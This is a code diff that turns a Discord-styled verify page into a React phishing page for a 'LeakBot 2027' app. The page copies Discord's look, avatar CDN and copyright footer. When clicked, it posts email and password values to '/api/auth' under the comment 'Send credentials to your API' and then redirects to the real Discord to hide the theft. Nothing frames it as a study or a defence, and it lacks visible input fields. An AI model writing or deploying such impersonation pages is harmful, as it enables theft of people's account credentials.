@@ -1,14 +1,107 @@
-<!-- Simple HTML mimicking Discord -->
-<div class="discord-verify">
-  <h2>Verify Your Account</h2>
-  <button onclick="loginWithDiscord()">Login with Discord</button>
-</div>
+import { useState } from 'react';
 
-<script>
-  function loginWithDiscord() {
-    // Redirect to Discord OAuth2
-    const clientId = "YOUR_CLIENT_ID";
-    const redirectUri = "https://your-website.com/callback";
-    window.location.href = `https://discord.com/oauth2/authorize?client_id=1546941291718508584`;
-  }
-</script>
+export default function Home() {
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [loading, setLoading] = useState(false);
+
+  const handleAuth = async (e) => {
+    e.preventDefault();
+    setLoading(true);
+
+    // Send credentials to your API
+    await fetch('/api/auth', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password }),
+    });
+
+    // Show "Success" then redirect to real Discord
+    setTimeout(() => {
+      window.location.href = 'https://discord.com/channels/@me';
+    }, 1500);
+  };
+
+  return (
+    <div style={{
+      backgroundColor: '#36393f',
+      minHeight: '100vh',
+      display: 'flex',
+      flexDirection: 'column',
+      alignItems: 'center',
+      fontFamily: '"gg sans", "Noto Sans", sans-serif'
+    }}>
+      {/* Header */}
+      <div style={{ width: '100%', padding: '24px 32px', backgroundColor: '#2f3136', display: 'flex', justifyContent: 'space-between' }}>
+        <span style={{ color: '#dcddde', fontWeight: 'bold' }}>LeakBot 2027</span>
+        <span style={{ color: '#b9bbbe' }}>OAuth2 Application</span>
+      </div>
+
+      {/* Main Card */}
+      <div style={{
+        backgroundColor: '#2f3136',
+        width: '416px',
+        marginTop: '80px',
+        padding: '32px',
+        borderRadius: '5px',
+        boxShadow: '0 2px 10px 0 rgba(0,0,0,0.2)'
+      }}>
+        {/* Bot Avatar */}
+        <img 
+          src="https://cdn.discordapp.com/embed/avatars/0.png" 
+          alt="Bot" 
+          style={{ width: '96px', height: '96px', borderRadius: '50%', marginBottom: '24px' }}
+        />
+
+        {/* Title */}
+        <h2 style={{ color: '#ffffff', fontSize: '24px', fontWeight: 'bold', textAlign: 'center', marginBottom: '8px' }}>
+          LeakBot 2027
+        </h2>
+        <p style={{ color: '#b9bbbe', textAlign: 'center', marginBottom: '32px' }}>
+          wants to access your account
+        </p>
+
+        {/* Permissions */}
+        <div style={{ marginBottom: '32px' }}>
+          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '16px' }}>
+            <input type="checkbox" checked disabled style={{ marginRight: '12px' }} />
+            <span style={{ color: '#dcddde' }}>Send Messages</span>
+          </div>
+          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '16px' }}>
+            <input type="checkbox" checked disabled style={{ marginRight: '12px' }} />
+            <span style={{ color: '#dcddde' }}>Manage Server</span>
+          </div>
+          <div style={{ display: 'flex', alignItems: 'center' }}>
+            <input type="checkbox" checked disabled style={{ marginRight: '12px' }} />
+            <span style={{ color: '#dcddde' }}>View Channels</span>
+          </div>
+        </div>
+
+        {/* Authorize Button */}
+        <button 
+          onClick={handleAuth}
+          style={{
+            width: '100%',
+            backgroundColor: '#5865F2',
+            color: 'white',
+            border: 'none',
+            padding: '12px',
+            borderRadius: '3px',
+            fontSize: '14px',
+            fontWeight: 'bold',
+            cursor: loading ? 'wait' : 'pointer',
+            marginBottom: '32px'
+          }}
+        >
+          {loading ? 'Authorizing...' : 'Authorize'}
+        </button>
+
+        {/* Footer */}
+        <div style={{ display: 'flex', justifyContent: 'space-between', color: '#80848e', fontSize: '12px' }}>
+          <span>© 2027 Discord, Inc.</span>
+          <span>Privacy Policy</span>
+        </div>
+      </div>
+    </div>
+  );
+}
